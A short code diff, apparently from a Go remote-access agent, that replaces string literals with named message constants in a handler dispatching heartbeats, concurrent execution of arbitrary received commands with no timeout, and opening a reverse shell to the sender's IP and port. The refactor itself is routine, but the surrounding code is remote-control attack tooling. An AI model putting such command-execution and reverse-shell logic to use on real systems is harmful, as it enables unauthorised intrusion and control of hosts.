@@ -38,13 +38,13 @@ func handleMessage(msg *message.Message) error {
 	case localIP().IP.To4().String():
 		switch msg.Type {
 		// Sends a heartbeat back to the source host to test connectivity
-		case "heartbeat":
+		case message.Heartbeat:
 			sendHeartbeat(msg)
 		// Executes the command on the target host
-		case "command":
+		case message.Command:
 			go executor.ExecuteCommand(msg.Data, nil) // execute the command concurrently with no timeout
 		// Opens a reverse shell on port specified in packet
-		case "shell":
+		case message.Shell:
 			go func() {
 				if err := executor.OpenReverseShell(msg.SrcIP, msg.SrcPort); err != nil {
 					return
